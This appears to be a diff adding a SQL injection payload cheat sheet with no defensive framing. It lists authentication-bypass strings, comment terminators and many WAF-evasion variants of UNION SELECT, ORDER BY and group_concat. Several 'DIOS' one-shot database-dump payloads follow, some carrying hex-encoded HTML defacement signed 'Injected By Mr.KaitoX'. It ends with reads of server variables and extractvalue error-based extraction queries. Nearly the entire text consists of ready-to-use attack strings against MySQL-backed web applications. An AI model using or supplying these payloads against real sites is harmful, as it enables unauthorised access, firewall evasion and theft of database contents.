@@ -1,0 +1,491 @@
+🍁 Admin bypass 🍁
+
+
+' or ''-'
+
+' or ''='
+
+' or ''&'
+
+' or ''^'
+
+' or ''*'
+
+" or ""-"
+
+" or ""="
+
+" or ""&"
+
+" or ""^"
+
+" or ""*"
+
+' or 'x'='x
+
+') or ('x')=('x
+
+')) or (('x'))=(('x
+
+" or "x"="x
+
+") or ("x")=("x
+
+")) or (("x"))=(("x
+
+
+
+
+
+
+
+
+🍁 Balancer  🍁
+
+
+--
+
+--+-
+
+--+
+
+-- -
+
+'-- -
+
+)--
+
+')--+
+
+') -- -
+
+%23
+
+%23%23
+
+%60
+
+%00
+
+;%00
+
+%90
+
+/*
+
+-- -/*
+
+
+
+
+
+
+
+🍁 Order by bypass 🍁
+
+
+order by/**_**/1--
+
+/*!12345order*/+/*!12345by*/1--
+
+')order by 1%23%23
+
+%')order by 1%23%23
+
+Null' order by 100--+
+
+')group by 99-- -
+
+'group by 119449-- -
+
+group/**/by/**/99%23%23
+
++%0aorder%0aby%0a+
+
++/*!42247order*//**//*!42247by*/+
+
+
+
+
+
+
+🍁 Union select normal waf bypass 🍁
+
+
++AND+0+/*!50000Union+SeleCt*/+
+
++AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+
+
++uniUNIONon/**/aALLll/**/selSELECTect/**/+
+
+
++/*!u%6eion*/+/*!se%6cect*/+
+
++/**//*!50000UnIOn*//*yoyu*/all/**/ /*!SeLEct*/ /*nnaa*/+
+
++/*!42247union*//**//*!42247select*/+
+
++union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+
+
+
+
+
+🍁 hard union select forbidden waf bypass 🍁
+
+
++And/**/.0union/*%26*/distinctROW+select+
+
++And .0UnIOn-- -%0ASeLe%43t+
+
+
++or .0union/**/distinctrow select/**/distinctrow+
+
++And .0union/**/distinctrow select/**/distinctrow+ 
+
+
+
+
+
+🍁 Buffer overflow 🍁
+
+
++uNIOn%23xxxxxxxxxxx%0aSELECT+
+
++and .0union/**/distinctrow%23GearFourthKKKKKKKKKKAAAAAAAAAAAAAIIIIIIIIIIIIIIIIIIITTTTTTTTTTTTTTTTTTTTTTOOOOOOOOOOOOOOOOOOO%0aselect/**/distinctrow+
+
++And+mod(29,0)+/*!50000UNioN*/+/*!50000SeLeCT*/+
+
++and(/*!50000select*/ 1)=(/*!32302select*/0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+/*!uNIOn*/+/*!SeLECt*/+
+
++Union%A0%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Select+
+
+
+
+
+
+🍁 Group concat 🍁
+
+
+/*!12345group_concat*/(/*!12345table_name*/)
+
+/*!50000group_concat*/(/*!50000table_name*/)
+
+/*!GrOuP_ConCaT*/()
+
+/*!12345GroUP_ConCat*/()
+
+/*!50000gRouP_cOnCaT*/()
+
+/*!50000Gr%6fuP_c%6fnCAT*/()
+
+/*!group_concat*/()
+
+group_concat(/*!*/)
+
+group_concat(/*!12345table_name*/)
+
+group_concat(/*!50000table_name*/)
+
+/*!group_concat*/()/*!12345table_name*/)
+
+/*!group_concat*/(/*!50000table_name*/)
+
+unhex(hex(group_concat(table_name)))
+
+unhex(hex(/*!group_concat*/()
+
+unhex(hex(/*!12345group_concat*/(table_name)))
+
+
+
+
+
+
+
+🍁 Polygon 🍁
+
+
++and+0+
+
++div+0+
+
+"+and+'1'='1+
+
+"+and+(1)=(1+
+
++div+false+
+
++having+1=0+
+
++having+false+
+
++and+false+
+
++and+null+
+
++AND+1=0+
+
+and(1)=(0)
+
++and(1)!=(0)+
+
++and+2>3+
+
++and/**/0/**/+
+
++and/**_**/0/**_**/+
+
++and+point(29,9)+
+
++and+mod(9,9)+
+
++and+power(5,5)+
+
++/*!aND*/+1+like+0+
+
++/*!or*/1='1+
+
++/*!50000or*/1='1'+
+
++limit+0+
+
+
+
+
+
+
+🍁 calculation 🍁
+
+or 1=1
+
+or 0=0
+
+or 25-10-5=5
+
+or 20-5-5=10
+
+or 25-5-5=15
+
+or 5*5*1=25
+
+or 5*5+5=30
+
+or 1<0
+
+
+
+
+
+
+
+
+🍁 Schema 🍁
+
+
++/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+
++/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
+
++/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+
++/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
+
++/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
+
++/*!50000frOm*/+/*!50000information_schema*/%252e/**/columns
+
+
+
+
+
+
+
+
+🍁 Basic DIOS 🍁
+
+(select group_concat(column_name,0x3c62723e,table_name) from information_schema.columns where table_schema=database())
+
+
+🍁 Smallest DIOS 🍁
+
+concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,0x3c6c693e,table_name,0x3a,column_name)),@)
+
+
+🍁 Simplest DIOS 🍁
+
+(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
+
+
+🍁 Make set DIOS 🍁
+
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+
+🍁Make set DIOS ( waf ) 🍁
+
+make_set(6,@:=0x0a,(/*!50000%53elect*/(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+
+🍁 DIOS bypass waf 🍁
+
+/*!50000cOnCat(@:=0,(/*!50000%53eLeCt*/ count(*)from /*!50000%69nformation_schema*/.columns where@:=concat(@,0x3c62723e,table_name,0x3a3a,column_name)),@)
+
+
+🍁 Dios by Mr.KaitoX 🍁
+
+Concat(0x3c7363726970743e646f63756d656e742e7469746c653d22496e6a6563746564204279204d722e4b6169746f58223b3c2f7363726970743e3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f6d617863646e2e626f6f74737472617063646e2e636f6d2f626f6f7473747261702f342e332e312f6373732f626f6f7473747261702e6d696e2e637373223e3c63656e7465723e3c696d67207372633d2268747470733a2f2f61766174617273302e67697468756275736572636f6e74656e742e636f6d2f752f34373936363936383f733d34363026753d3431663665323164303039353337663932623532333430306638326230333664393934356163613626763d342220636c6173733d226d782d6175746f20642d626c6f636b20696d672d666c75696422207469746c653d226d722e6b6169746f782220616c743d226d722e6b6169746f7822207374796c653d2277696474683a2032303070783b206865696768743a20323030707822202f3e3c2f63656e7465723e3c683220636c6173733d22746578742d63656e74657220746578742d64616e676572223e3c623e496e6a6563746564204279204d722e4b6169746f583c2f623e3c2f68323e3c63656e7465723e3c736d616c6c3e3c623e446174653a,NOW(),0x3c2f623e3c2f736d616c6c3e3c2f63656e7465723e3c62723e3c64697620636c6173733d227461626c652d726573706f6e73697665223e3c7461626c6520636c6173733d227461626c65207461626c652d73747269706564207461626c652d626f726465726564207461626c652d686f766572223e3c74723e3c746820636f6c7370616e3d22322220636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e42617369632053746174656d656e743c2f74683e3c2f74723e3c74723e3c74643e486f7374204e616d653a3c2f74643e3c74643e,@@hostname,0x3c2f74643e3c2f74723e3c74723e3c74643e44617461626173653a3c2f74643e3c74643e,database(),0x3c2f74643e3c2f74723e3c74723e3c74643e557365723a3c2f74643e3c74643e,current_user(),0x3c2f74643e3c2f74723e3c74723e3c74643e4f7065726174696f6e2073797374656d3c2f74643e3c74643e,@@version_compile_os,0x3c2f74643e3c2f74723e3c74723e3c74643e56657273696f6e3a3c2f74643e3c74643e,version(),0x3c2f74643e3c2f74723e3c74723e3c74643e506f72743a3c2f74643e3c74643e,@@port,0x3c2f74643e3c2f74723e3c74723e3c74643e44617461204469723a3c2f74643e3c74643e,@@datadir,0x3c2f74643e3c2f74723e3c74723e3c74643e53796d6c696e6b3a3c2f74643e3c74643e,@@GLOBAL.have_symlink,0x3c2f74643e3c2f74723e3c74723e3c74643e53534c3a3c2f74643e3c74643e,@@GLOBAL.have_ssl,0x3c2f74643e3c2f74723e3c74723e3c74643e50726976696c65676573202f20696e74726f206f757466696c6520636865636b3c2f74643e3c74643e,(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c2f74643e3c2f74723e3c2f7461626c653e3c62723e3c7461626c6520636c6173733d227461626c65207461626c652d73747269706564207461626c652d626f726465726564207461626c652d686f766572223e3c74723e3c746820636f6c7370616e3d22322220636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e44554d5020444154413c2f74683e3c2f74723e3c74723e3c746820636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e5461626c65204e616d653c2f74683e3c746820636c6173733d22746578742d63656e7465722062672d6461726b20746578742d7768697465223e4669656c64204e616d653c2f74683e3c2f74723e3c74723e,(select(@x)from(select(@x:=0x00),(select(0)/*!From*/(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat (@x,0x3c74723e3c74643e,table_name,0x3c2f74643e3c74643e,column_name))))x),0x3c2f74723e3c2f7461626c653e3c2f6469763e3c63656e7465723e3c7374726f6e673e4b6169746f4c6567696f6e3c2f7374726f6e673e3c2f63656e7465723e3c62723e203c212d2d)
+
+
+🍁 Make_set DIOS, without group_concat, concat_ws, concat 🍁
+
+make_set(3,version()),make_set(6,@sweet:=database(),(select 1 from(information_schema.tables)where(table_schema=database())and@sweet:=make_set(15,@sweet,0x3c62723e3c666f6e7420636f6c6f723d626c75652073697a653d333e,table_name,0x3c2f666f6e743e)),@sweet)
+
+
+🍁 DIOS using 'amir', hex, binary, MySQLchar etc 🍁
+
+CONCAT_WS(0x3c666f6e7420636f6c6f723d7265643e,0x3c623e,0x3c666f6e7420636f6c6f723d677265656e2073697a653d353e496e6a6563746564204279205075726558706c6f69743c2f666f6e743e,0x3c62723e,0x55736572203a20,system_user(),0x3c62723e,0x4461746162617365203a20,schema(),0x3c62723e,0x56657273696f6e203a20,innodb_version(),0x2d,0x3c62723e,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c666f6e7420636f6c6f723d2723,rand()*100000,0x3c6c693e,table_name,column_name)),@))
+
+
+🍁 DIOS with IFNULL Function 🍁
+
+concat(0x3c666f6e7420636f6c6f723d707572706c653e3c623e3c693e496e6a6563746564204279205075726558706c6f6974203a3a,@@version,0x3c62723e,0x3c62723e,(SELECT+GROUP_CONCAT(table_name,0x203a3a20,ifnull(table_rows,0)+order+by+ifnull(table_rows,0)+ASC+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()))
+
+
+🍁 TWIN injection DIOS 🍁
+
+(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in(@:=concat(@,0x3C,0x62,0x72,0x3E,' [ ',table_schema,' ] >',table_name,' > ',column_name))))a)
+
+
+🍁 Get version without version() and, @@version 🍁
+
+(select variable_value from information_schema.session_variables where variable_name like 0x76657273696f6e)
+
+
+🍁 DIOS by Kaito 🍁
+
+/*!00000/*!00000(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,database(),0x3a3a,table_name,0x203a3a20,column_name))))x)*/
+
+
+🍁 DIOS by Kaito (WAF) 🍁
+
+/*!50000coNcat*/(0x3c666f6e7420636f6c6f723d22726564223e3c623e4d722e4b6169746f583c2f623e3c2f666f6e743e,0x3c62723e,0x56657273696f6e203a3a20,version(),0x3c62723e,0x55736572203a3a20,user/**/(),0x3c62723e,0x4461746162617365203a3a20,database/**_**/(),0x3c62723e,0x3c62723e,(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x))
+
+
+🍁 DIOS WAF Mod_Security 🍁
+
+/*!50000CONCAT*/(0x3c43656e7465723e,0x496e6a656374696f6e204279204d72765f323331,0x3c62723e,0x3c62723e,version/***/(),0x3c62723e,database/**/(),0x3c62723e,user/**/(),@C:=0x3c62723e,If((/!50000Select*/+Count()+/!50000From*/+/*!50000Information_Schema*/.Columns+/*!50000Where*/+Table_Schema=database/***/()+And+@C:=/!50000CONCAT*/(@C,0x3c62723e,/*!50000Table_Name*/,0x3a,0x3a,0x3a,0x3a,/*!50000Column_Name*/)),0x3a,0x00),@C)
+
+
+🍁 DIOS replace() 🍁
+
+replace(replace(replace(0x232425,0x23,@:=replace(replace(0x243a3a25,0x24,@@version),0x25 ,version())),0x24,(select+count(*)from+/*!50000information_schema*/.columns+where+table_schema=database()+and@:=replace(replace(replace(0x03c62723e2a3a3a2d,0x00,@),0x2a,table_name),0x2d,Column_name))),0x25,@)
+
+
+🍁 DIOS Reverse 🍁
+
+reverse(insert(0x1,1,0,reverse(concat (unhex(hex(table_name)),0x203a20,unhex(hex(column_name)),0x3c62723e)))) from information_schema 0.e.columns limit 1,1
+
+
+🍁 DIOS by Export_Set 🍁
+
+export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns where table_schema=database() and @:=export_set(5,export_set%285,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)
+
+
+🍁 DIOS MID_SEPARATOR 🍁
+
+(select+MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024)+FROM information_schema.columns)
+
+
+
+
+
+
+🍁 System print 🍁
+
+
+now()
+
+@@hostname
+
+@@port
+
+@@tmpdir
+
+@@datadir
+
+@@basedir
+
+@@log
+
+@@log_bin
+
+@@log_error
+
+@@binlog_format
+
+@@time_format
+
+@@date_format
+
+@@ft_boolean_syntax
+
+@@innodb_log_group_home_dir
+
+@@new
+
+@@version
+
+@@version_comment
+
+@@version_compile_os
+
+@@version_compile_machine
+
+@@GLOBAL.have_symlink
+
+@@GLOBAL.have_ssl
+
+@@GLOBAL.VERSION
+
+version()
+
+user()
+
+database()
+
+schema()
+
+system_user()
+
+session_user()
+
+UUID()
+
+current_user()
+
+@@collation(user())
+
+
+
+
+
+
+🍁 Xpath Injection 🍁 
+
+
+Version=>
+
++and extractvalue(0x0a,concat(0x0a,(select version()))) 
+
+Databse=>
+
++and extractvalue(0x0a,concat(0x0a,(select database()))) 
+
+Tables =>
+
++and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) 
+
+Column (when table is - admin) => 
+
++and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x61646d696e limit 0,1)))
